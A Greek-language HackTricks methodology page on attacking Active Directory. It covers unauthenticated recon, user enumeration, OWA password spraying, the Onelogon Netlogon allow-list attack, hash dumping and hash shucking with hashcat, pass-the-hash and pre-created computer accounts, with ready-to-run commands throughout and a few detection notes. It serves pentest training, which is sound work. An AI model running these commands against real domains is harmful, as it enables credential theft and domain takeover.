# Μεθοδολογία Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Βασική επισκόπηση

Το **Active Directory** αποτελεί θεμελιώδη τεχνολογία, επιτρέποντας στους **network administrators** να δημιουργούν και να διαχειρίζονται αποτελεσματικά **domains**, **users** και **objects** μέσα σε ένα δίκτυο. Είναι σχεδιασμένο για κλιμάκωση, διευκολύνοντας την οργάνωση μεγάλου αριθμού χρηστών σε διαχειρίσιμα **groups** και **subgroups**, ενώ ελέγχει τα **access rights** σε διάφορα επίπεδα.

Η δομή του **Active Directory** αποτελείται από τρία βασικά επίπεδα: **domains**, **trees** και **forests**. Ένα **domain** περιλαμβάνει μια συλλογή από objects, όπως **users** ή **devices**, που μοιράζονται μια κοινή βάση δεδομένων. Τα **trees** είναι groups αυτών των domains, συνδεδεμένα μέσω μιας κοινής δομής, ενώ ένα **forest** αντιπροσωπεύει τη συλλογή πολλαπλών trees, τα οποία συνδέονται μέσω **trust relationships**, σχηματίζοντας το ανώτατο επίπεδο της οργανωτικής δομής. Συγκεκριμένα **access** και **communication rights** μπορούν να οριστούν σε καθένα από αυτά τα επίπεδα.

Οι βασικές έννοιες του **Active Directory** περιλαμβάνουν:

1. **Directory** – Περιέχει όλες τις πληροφορίες που αφορούν τα objects του Active Directory.
2. **Object** – Αναφέρεται σε οντότητες μέσα στο directory, όπως **users**, **groups** ή **shared folders**.
3. **Domain** – Λειτουργεί ως container για τα directory objects, με δυνατότητα συνύπαρξης πολλαπλών domains μέσα σε ένα **forest**, όπου το καθένα διατηρεί τη δική του συλλογή objects.
4. **Tree** – Μια ομάδα domains που μοιράζονται ένα κοινό root domain.
5. **Forest** – Το ανώτατο επίπεδο της οργανωτικής δομής στο Active Directory, αποτελούμενο από αρκετά trees με **trust relationships** μεταξύ τους.

Το **Active Directory Domain Services (AD DS)** περιλαμβάνει μια σειρά από services κρίσιμα για την κεντρική διαχείριση και επικοινωνία μέσα σε ένα δίκτυο. Αυτά τα services περιλαμβάνουν:

1. **Domain Services** – Συγκεντρώνει την αποθήκευση δεδομένων και διαχειρίζεται τις αλληλεπιδράσεις μεταξύ **users** και **domains**, συμπεριλαμβανομένων των λειτουργιών **authentication** και **search**.
2. **Certificate Services** – Επιβλέπει τη δημιουργία, διανομή και διαχείριση ασφαλών **digital certificates**.
3. **Lightweight Directory Services** – Υποστηρίζει directory-enabled εφαρμογές μέσω του **LDAP protocol**.
4. **Directory Federation Services** – Παρέχει δυνατότητες **single-sign-on** για την authentication χρηστών σε πολλές web εφαρμογές μέσα σε μία συνεδρία.
5. **Rights Management** – Συμβάλλει στην προστασία υλικού που καλύπτεται από copyright, ρυθμίζοντας τη μη εξουσιοδοτημένη διανομή και χρήση του.
6. **DNS Service** – Είναι κρίσιμο για την επίλυση **domain names**.

Για πιο λεπτομερή επεξήγηση, δείτε: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Για να μάθετε πώς να **attack an AD**, πρέπει να **understand** πολύ καλά τη διαδικασία **Kerberos authentication**.\
[**Διαβάστε αυτή τη σελίδα αν δεν γνωρίζετε ακόμη πώς λειτουργεί.**](kerberos-authentication.md)

## Cheat Sheet

Μπορείτε να χρησιμοποιήσετε το [https://wadcoms.github.io/](https://wadcoms.github.io) για μια γρήγορη επισκόπηση των commands που μπορείτε να εκτελέσετε για να κάνετε enumerate/exploit ένα AD.

> [!WARNING]
> Η επικοινωνία Kerberos συνήθως **requires a fully qualified domain name (FQDN)**, ώστε ο client να μπορεί να λάβει ticket για το σωστό SPN. Η πρόσβαση σε ένα machine μέσω IP address συνήθως καταλήγει σε NTLM αντί για Kerberos.

## Recon Active Directory (No creds/sessions)

Αν έχετε απλώς πρόσβαση σε ένα AD environment, αλλά δεν έχετε credentials/sessions, μπορείτε να:

- **Κάνετε Pentest στο δίκτυο:**
- Κάντε scan στο δίκτυο, βρείτε machines και open ports και προσπαθήστε να **exploit vulnerabilities** ή να **extract credentials** από αυτά (για παράδειγμα, [οι printers μπορεί να είναι πολύ ενδιαφέροντες στόχοι](ad-information-in-printers.md)).
- Το Enumerating του DNS μπορεί να παρέχει πληροφορίες για βασικούς servers στο domain, όπως web, printers, shares, vpn, media κ.λπ.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Δείτε τη γενική [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) για περισσότερες πληροφορίες σχετικά με το πώς να το κάνετε αυτό.
- **Ελέγξτε για null και Guest access στα smb services** (αυτό δεν θα λειτουργήσει σε σύγχρονες εκδόσεις των Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Ένας πιο λεπτομερής οδηγός για το πώς να κάνετε enumerate έναν SMB server βρίσκεται εδώ:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Κάντε enumerate το LDAP**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Ένας πιο λεπτομερής οδηγός για το πώς να κάνετε enumerate το LDAP βρίσκεται εδώ (δώστε **ιδιαίτερη προσοχή στο anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Κάντε Poison το δίκτυο**
- Συλλέξτε credentials [**κάνοντας impersonate services με το Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Αποκτήστε πρόσβαση σε host [**κάνοντας abuse το relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Συλλέξτε credentials **exposing** [**fake UPnP services με το evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Εξαγάγετε usernames/names από internal documents, social media και services (κυρίως web) μέσα στα domain environments, καθώς και από τις δημόσια διαθέσιμες πηγές.
- Αν βρείτε τα πλήρη ονόματα των εργαζομένων μιας εταιρείας, μπορείτε να δοκιμάσετε διαφορετικά AD **username conventions (**[**διαβάστε αυτό**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Οι πιο συνηθισμένες conventions είναι: _NameSurname_, _Name.Surname_, _NamSur_ (3letters από το καθένα), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _τυχαία γράμματα και 3 τυχαίοι αριθμοί_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Ελέγξτε τις σελίδες [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) και [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Όταν ζητείται ένα **invalid username**, ο server απαντά χρησιμοποιώντας τον **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, επιτρέποντάς μας να προσδιορίσουμε ότι το username ήταν invalid. Τα **Valid usernames** θα προκαλέσουν είτε την επιστροφή του **TGT σε μια AS-REP** response είτε το error _KRB5KDC_ERR_PREAUTH_REQUIRED_, υποδεικνύοντας ότι ο user απαιτείται να εκτελέσει pre-authentication.
- **No Authentication against MS-NRPC**: Χρήση του auth-level = 1 (No authentication) απέναντι στο interface MS-NRPC (Netlogon) των domain controllers. Η μέθοδος καλεί τη function `DsrGetDcNameEx2` μετά το binding στο interface MS-NRPC, για να ελέγξει αν υπάρχει ο user ή ο computer χωρίς credentials. Το tool [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) υλοποιεί αυτόν τον τύπο enumeration. Η έρευνα βρίσκεται [εδώ](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Αν εντοπίσετε έναν από αυτούς τους servers στο δίκτυο, μπορείτε επίσης να πραγματοποιήσετε **user enumeration εναντίον του**. Για παράδειγμα, μπορείτε να χρησιμοποιήσετε το εργαλείο [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Μπορείτε να βρείτε λίστες με usernames σε [**αυτό το github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) και σε αυτό ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Ωστόσο, θα πρέπει να έχετε τα **ονόματα των ατόμων που εργάζονται στην εταιρεία** από το recon step που θα έπρεπε να έχετε πραγματοποιήσει πριν από αυτό. Με το όνομα και το επώνυμο, θα μπορούσατε να χρησιμοποιήσετε το script [**namemash.py**](https://gist.github.com/superkojiman/11076951) για να δημιουργήσετε πιθανά έγκυρα usernames.

### Κατάχρηση allow-list ευάλωτου καναλιού Netlogon (Onelogon)

Ακόμη και μετά το patching του **Zerologon στο DC**, οι λογαριασμοί που έχουν προστεθεί ρητά σε allow-list μπορεί να εξακολουθούν να είναι εκτεθειμένοι σε **legacy/ευάλωτη συμπεριφορά secure-channel του Netlogon**. Η επικίνδυνη ρύθμιση είναι το GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** ή η αντίστοιχη τιμή registry **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Αυτή η τιμή είναι ένας **SDDL security descriptor** (δείτε το [Security Descriptors](security-descriptors.md)). Οποιοσδήποτε λογαριασμός ή group διαθέτει το σχετικό ACE στο DACL μπορεί να γίνει στόχος. Για παράδειγμα, το `O:BAG:BAD:(A;;RC;;;WD)` ουσιαστικά προσθέτει το **Everyone** σε allow-list.

Πρακτικό workflow για τον operator:

1. **Εντοπίστε τους principals που βρίσκονται σε allow-list** ελέγχοντας τόσο το **SYSVOL/GPO** όσο και το **live DC registry**.
2. **Κάντε resolve τα SIDs** που βρίσκονται στο SDDL σε πραγματικούς AD users/computers και δώστε προτεραιότητα σε **DC machine accounts**, **trust accounts** και άλλα privileged machines.
3. Επιχειρήστε επανειλημμένα **MS-NRPC / Netlogon authentication** ως ο λογαριασμός που βρίσκεται σε allow-list.
4. Μετά από μια επιτυχημένη εικασία, κάντε abuse του **Netlogon password-setting** για να επαναφέρετε το password του target account (το public PoC το ορίζει σε κενή συμβολοσειρά).<sup>[[9]](#references)[[10]](#references)</sup>

Γρήγορα παραδείγματα triage / lab από το public artifact:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Σημειώσεις:

- Ο **scanner** είναι χρήσιμος επειδή η effective allow-list μπορεί να βρίσκεται στο **SYSVOL**, στο **registry** ή και στα δύο.
- Η ίδια η διαδρομή του exploit είναι σημαντική, επειδή **δεν απαιτεί δικαιώματα Domain Admin** αφού εντοπιστεί ένας ευάλωτος λογαριασμός.
- Η παραβίαση ενός **Domain Controller machine account**, όπως το `DC$`, είναι ιδιαίτερα επικίνδυνη, επειδή το reset του password μπορεί να ενεργοποιήσει άμεσα ευρύτερες διαδρομές για **AD takeover**.
- Η εφικτότητα του **Brute-force** εξαρτάται από το mode: το public artifact περιγράφει μια προσέγγιση meet-in-the-middle, ένα **24-bit** brute force όταν υπάρχει διαθέσιμος άλλος computer account και πιο αργές παραλλαγές **32-bit**.

Σημειώσεις Detection / hardening:

- Ελέγξτε την allow-list policy και αφαιρέστε οτιδήποτε εκτός από προσωρινές, ρητά απαιτούμενες εξαιρέσεις συμβατότητας.
- Παρακολουθήστε τα **System** events του DC **5827/5828/5829/5830/5831** για να εντοπίζετε ευάλωτες συνδέσεις Netlogon που απορρίφθηκαν, εντοπίστηκαν ή επιτράπηκαν ρητά από την policy.
- Αντιμετωπίστε τους λογαριασμούς στο `VulnerableChannelAllowList` ως **high-risk** μέχρι να αφαιρεθεί η legacy εξάρτηση.

### Γνωρίζοντας ένα ή περισσότερα usernames

Εντάξει, γνωρίζετε ήδη ένα έγκυρο username αλλά κανένα password... Τότε δοκιμάστε:

- [**ASREPRoast**](asreproast.md): Αν ένας user **δεν έχει** το attribute _DONT_REQ_PREAUTH_, μπορείτε να **ζητήσετε ένα AS_REP message** για τον συγκεκριμένο user, το οποίο θα περιέχει δεδομένα κρυπτογραφημένα με παράγωγο του password του user.
- [**Password Spraying**](password-spraying.md): Ας δοκιμάσουμε τα πιο **συνηθισμένα passwords** με καθέναν από τους users που εντοπίστηκαν· ίσως κάποιος user χρησιμοποιεί ένα αδύναμο password (έχετε υπόψη την password policy!).
- Σημειώστε ότι μπορείτε επίσης να κάνετε **spray OWA servers** για να προσπαθήσετε να αποκτήσετε πρόσβαση στους mail servers των users.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Ίσως μπορέσετε να **αποκτήσετε** ορισμένα challenge **hashes**, κάνοντας **poisoning** σε κάποια πρωτόκολλα του **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Η enumeration του Active Directory παρέχει usernames, email identifiers και naming patterns, candidate hosts και services που μπορεί να εξαναγκαστούν να κάνουν authentication. Χρησιμοποιήστε αυτό το context για να εντοπίσετε βιώσιμα NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) και πιθανά paths προς το περιβάλλον AD.

### NetExec workspace-driven recon & relay posture checks

- Χρησιμοποιήστε **`nxcdb` workspaces** για να διατηρείτε την κατάσταση του AD recon ανά engagement: το `workspace create <name>` δημιουργεί SQLite DBs ανά protocol κάτω από `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Αλλάξτε views με `proto smb|mssql|winrm` και εμφανίστε τα secrets που συλλέχθηκαν με `creds`. Διαγράψτε χειροκίνητα τα sensitive data όταν ολοκληρώσετε: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Το γρήγορο subnet discovery με **`netexec smb <cidr>`** εμφανίζει το **domain**, το **OS build**, τις **SMB signing requirements** και το **Null Auth**. Τα members που εμφανίζουν `(signing:False)` είναι **relay-prone**, ενώ τα DCs συνήθως απαιτούν signing.
- Δημιουργήστε **hostnames στο /etc/hosts** απευθείας από το output του NetExec, ώστε να διευκολύνετε το targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Όταν το **SMB relay προς τον DC είναι αποκλεισμένο** λόγω signing, ελέγξτε και τη στάση του **LDAP**: το `netexec ldap <dc>` επισημαίνει `(signing:None)` / weak channel binding. Ένας DC με υποχρεωτικό SMB signing αλλά απενεργοποιημένο LDAP signing παραμένει βιώσιμος **relay-to-LDAP** στόχος για abuses όπως το **SPN-less RBCD**.

### Διαρροές διαπιστευτηρίων από printer στην πλευρά του client → μαζική επικύρωση domain διαπιστευτηρίων

- Τα web UIs των printer μερικές φορές **ενσωματώνουν masked κωδικούς admin σε HTML**. Η προβολή του source/devtools μπορεί να αποκαλύψει το cleartext (π.χ. `<input value="<password>">`), επιτρέποντας πρόσβαση Basic-auth για σάρωση/εκτύπωση repositories.
- Τα ανακτημένα print jobs μπορεί να περιέχουν **έγγραφα onboarding σε plaintext** με κωδικούς ανά χρήστη. Διατηρήστε τις αντιστοιχίσεις ευθυγραμμισμένες κατά τις δοκιμές:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Κλοπή NTLM Creds

Αν μπορείτε να **έχετε πρόσβαση σε άλλους υπολογιστές ή shares** με τον **null ή guest user**, θα μπορούσατε να **τοποθετήσετε αρχεία** (όπως ένα αρχείο SCF) τα οποία, αν προσπελαστούν με κάποιον τρόπο, θα **προκαλέσουν NTLM authentication εναντίον σας**, ώστε να μπορέσετε να **κλέψετε** το **NTLM challenge** και να το κάνετε crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

Το **hash shucking** αντιμετωπίζει κάθε NT hash που διαθέτετε ήδη ως υποψήφιο password για άλλες, πιο αργές μορφές, των οποίων το key material παράγεται απευθείας από το NT hash. Αντί να κάνετε brute-force σε μεγάλες passphrases μέσα σε Kerberos RC4 tickets, NetNTLM challenges ή cached credentials, δίνετε τα NT hashes στα NT-candidate modes του Hashcat και το αφήνετε να επαληθεύσει την επαναχρησιμοποίηση password χωρίς να μάθετε ποτέ το plaintext. Αυτό είναι ιδιαίτερα αποτελεσματικό μετά από domain compromise, όταν μπορείτε να συλλέξετε χιλιάδες τρέχοντα και ιστορικά NT hashes.<sup>[[5]](#references)</sup>

Χρησιμοποιήστε shucking όταν:

- Έχετε ένα NT corpus από DCSync, SAM/SECURITY dumps ή credential vaults και χρειάζεται να ελέγξετε για επαναχρησιμοποίηση σε άλλα domains/forests.
- Συλλαμβάνετε Kerberos material βασισμένο σε RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses ή DCC/DCC2 blobs.
- Θέλετε να αποδείξετε γρήγορα την επαναχρησιμοποίηση μεγάλων, μη crackable passphrases και να κάνετε άμεσα pivot μέσω Pass-the-Hash.

Η τεχνική **δεν λειτουργεί** εναντίον encryption types των οποίων τα keys δεν είναι το NT hash (π.χ. Kerberos etype 17/18 AES). Αν ένα domain επιβάλλει AES-only, πρέπει να επιστρέψετε στα κανονικά password modes.

#### Δημιουργία NT hash corpus

- **DCSync/NTDS** – Χρησιμοποιήστε το `secretsdump.py` με history για να συλλέξετε το μεγαλύτερο δυνατό σύνολο NT hashes (και τις προηγούμενες τιμές τους):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Οι καταχωρίσεις history διευρύνουν σημαντικά το candidate pool, επειδή η Microsoft μπορεί να αποθηκεύει έως και 24 προηγούμενα hashes ανά account. Για περισσότερους τρόπους συλλογής NTDS secrets, δείτε:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – Το `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ή το Mimikatz `lsadump::sam /patch`) εξάγει τοπικά δεδομένα SAM/SECURITY και cached domain logons (DCC/DCC2). Αφαιρέστε τα διπλότυπα και προσθέστε αυτά τα hashes στην ίδια λίστα `nt_candidates.txt`.
- **Καταγραφή metadata** – Διατηρήστε το username/domain που παρήγαγε κάθε hash (ακόμη και αν το wordlist περιέχει μόνο hex). Τα matching hashes σάς δείχνουν αμέσως ποιο principal επαναχρησιμοποιεί ένα password, μόλις το Hashcat εμφανίσει το winning candidate.
- Προτιμήστε candidates από το ίδιο forest ή από trusted forest· έτσι μεγιστοποιείται η πιθανότητα overlap κατά το shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Σημειώσεις:

- Τα NT-candidate inputs **πρέπει να παραμένουν raw 32-hex NT hashes**. Απενεργοποιήστε τα rule engines (χωρίς `-r`, χωρίς hybrid modes), επειδή το mangling καταστρέφει το candidate key material.
- Αυτά τα modes δεν είναι εγγενώς ταχύτερα, αλλά το NTLM keyspace (~30.000 MH/s σε M3 Max) είναι περίπου 100× ταχύτερο από το Kerberos RC4 (~300 MH/s). Ο έλεγχος μιας curated NT list είναι πολύ φθηνότερος από την εξερεύνηση ολόκληρου του password space στη slow format.
- Εκτελείτε πάντα το **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`), επειδή τα modes 31500/31600/35300/35400 κυκλοφόρησαν πρόσφατα.<sup>[[7]](#references)</sup>
- Προς το παρόν δεν υπάρχει NT mode για AS-REQ Pre-Auth, ενώ τα AES etypes (19600/19700) απαιτούν το plaintext password, επειδή τα keys τους παράγονται μέσω PBKDF2 από passwords σε UTF-16LE και όχι από raw NT hashes.

#### Παράδειγμα – Kerberoast RC4 (mode 35300)

1. Συλλάβετε ένα RC4 TGS για ένα target SPN με low-privileged user (δείτε τη σελίδα Kerberoast για λεπτομέρειες):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Κάντε shuck στο ticket με τη NT list σας:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Το Hashcat παράγει το RC4 key από κάθε NT candidate και επαληθεύει το `$krb5tgs$23$...` blob. Ένα match επιβεβαιώνει ότι το service account χρησιμοποιεί ένα από τα υπάρχοντα NT hashes σας.

3. Κάντε άμεσα pivot μέσω PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Προαιρετικά, μπορείτε να ανακτήσετε αργότερα το plaintext με `hashcat -m 1000 <matched_hash> wordlists/`, αν χρειάζεται.

#### Παράδειγμα – Cached credentials (mode 31600)

1. Κάντε dump τα cached logons από ένα compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Αντιγράψτε τη γραμμή DCC2 για τον ενδιαφέροντα domain user στο `dcc2_highpriv.txt` και κάντε shuck:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Ένα επιτυχές match επιστρέφει το NT hash που είναι ήδη γνωστό στη λίστα σας, αποδεικνύοντας ότι ο cached user επαναχρησιμοποιεί ένα password. Χρησιμοποιήστε το απευθείας για PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ή κάντε brute-force σε fast NTLM mode για να ανακτήσετε το string.

Ακριβώς το ίδιο workflow ισχύει για NetNTLM challenge-responses (`-m 27000/27100`) και DCC (`-m 31500`). Μόλις εντοπιστεί ένα match, μπορείτε να εκκινήσετε relay, SMB/WMI/WinRM PtH ή να κάνετε re-crack το NT hash με masks/rules offline.



## Enumerating Active Directory ΜΕ credentials/session

Για αυτή τη φάση πρέπει να έχετε **κάνει compromise στα credentials ή σε session ενός έγκυρου domain account**. Αν διαθέτετε έγκυρα credentials ή shell ως domain user, **πρέπει να θυμάστε ότι οι επιλογές που δόθηκαν προηγουμένως εξακολουθούν να είναι διαθέσιμες για το compromise άλλων users**.

Πριν ξεκινήσετε authenticated enumeration, κατανοήστε το **Kerberos double-hop problem**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Το compromise ενός account αποτελεί **σημαντικό βήμα για την αξιολόγηση του domain**, επειδή επιτρέπει authenticated **Active Directory enumeration**:

Όσον αφορά το [**ASREPRoast**](asreproast.md), μπορείτε πλέον να βρείτε κάθε πιθανό vulnerable user, ενώ όσον αφορά το [**Password Spraying**](password-spraying.md), μπορείτε να αποκτήσετε μια **λίστα όλων των usernames** και να δοκιμάσετε το password του compromised account, κενά passwords και νέα promising passwords.

- Μπορείτε να χρησιμοποιήσετε το [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Μπορείτε επίσης να χρησιμοποιήσετε το [**powershell for recon**](../basic-powershell-for-pentesters/index.html), το οποίο θα είναι πιο stealthy
- Μπορείτε επίσης να [**use powerview**](../basic-powershell-for-pentesters/powerview.md) για να εξαγάγετε πιο λεπτομερείς πληροφορίες
- Ένα ακόμη εξαιρετικό tool για recon σε ένα active directory είναι το [**BloodHound**](bloodhound.md). Δεν είναι **πολύ stealthy** (ανάλογα με τις collection methods που χρησιμοποιείτε), αλλά **αν δεν σας ενδιαφέρει**, πρέπει οπωσδήποτε να το δοκιμάσετε. Βρείτε πού μπορούν οι users να κάνουν RDP, βρείτε path προς άλλα groups κ.λπ.
- **Άλλα automated AD enumeration tools είναι τα:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md), καθώς μπορεί να περιέχουν ενδιαφέρουσες πληροφορίες.
- Ένα **tool με GUI** που μπορείτε να χρησιμοποιήσετε για να κάνετε enumerate το directory είναι το **AdExplorer.exe** από το **SysInternal** Suite.
- Μπορείτε επίσης να κάνετε search στη LDAP database με το **ldapsearch** για να αναζητήσετε credentials στα fields _userPassword_ και _unixUserPassword_, ή ακόμη και στο _Description_. Δείτε το [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) για άλλες methods.
- Αν χρησιμοποιείτε **Linux**, μπορείτε επίσης να κάνετε enumerate το domain χρησιμοποιώντας το [**pywerview**](https://github.com/the-useless-one/pywerview).
- Μπορείτε επίσης να δοκιμάσετε automated tools όπως:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Εξαγωγή όλων των domain users**

Είναι πολύ εύκολο να αποκτήσετε όλα τα domain usernames από Windows (`net user /domain`, `Get-DomainUser` ή `wmic useraccount get name,sid`). Σε Linux, μπορείτε να χρησιμοποιήσετε: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ή `enum4linux -a -u "user" -p "password" <DC IP>`

> Ακόμη και αν αυτή η ενότητα Enumeration φαίνεται μικρή, αποτελεί το σημαντικότερο μέρος όλων. Ανοίξτε τα links (κυρίως εκείνα των cmd, powershell, powerview και BloodHound), μάθετε πώς να κάνετε enumerate ένα domain και εξασκηθείτε μέχρι να νιώθετε άνετα. Κατά τη διάρκεια ενός assessment, αυτή θα είναι η κρίσιμη στιγμή για να βρείτε τον τρόπο προς DA ή να αποφασίσετε ότι δεν μπορεί να γίνει τίποτα.

### Predictable pre-created computer accounts -> gMSA password access

Τα computer accounts που έχουν staged για legacy joins μπορεί να διατηρούν ένα προβλέψιμο αρχικό password. Το module `pre2k` του NetExec εντοπίζει τη χαρακτηριστική τιμή `userAccountControl` `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) και επιχειρεί ένα Kerberos TGT με τους πρώτους 14 χαρακτήρες του lowercase computer name, χωρίς το τελικό `$`. Αντιμετωπίστε αυτή την τιμή UAC ως candidate selector και όχι ως απόδειξη ότι η συμμετοχή στο **Pre-Windows 2000 Compatible Access** από μόνη της σημαίνει ότι το password είναι weak.<sup>[[18]](#references)[[20]](#references)</sup>

Χρησιμοποιήστε authenticated LDAP enumeration για να ελέγξετε τα candidates και να αποθηκεύσετε τα επιτυχημένα TGTs. Το `ALL=True` διευρύνει το testing πέρα από objects με το προεπιλεγμένο `4128` filter.<sup>[[18]](#references)</sup>
```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```
